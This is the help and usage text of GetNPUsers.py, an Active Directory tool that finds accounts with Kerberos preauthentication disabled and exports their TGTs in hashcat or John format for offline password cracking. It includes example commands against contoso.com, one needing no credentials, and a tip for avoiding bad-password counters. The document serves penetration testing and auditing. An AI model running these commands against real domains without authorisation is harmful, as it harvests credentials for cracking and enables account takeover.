```
usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
```
```
positional arguments:
  target                domain/username[:password]
```
```
optional arguments:
  -h, --help            show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        format to save the AS_REQ of users without pre-authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
```
```
authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
```
```
There are a few modes for using this script

1. Get a TGT for a user:

        GetNPUsers.py contoso.com/john.doe -no-pass

For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script, 
otherwise a badpwdcount entry will be added to the user
```
```
2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set

        GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily

This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. 
However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)
```
```
3. Request TGTs for all users

        GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily
```
```
4. Request TGTs for users in a file

        GetNPUsers.py contoso.com/ -no-pass -usersfile users.txt

For this operation you don't need credentials.
```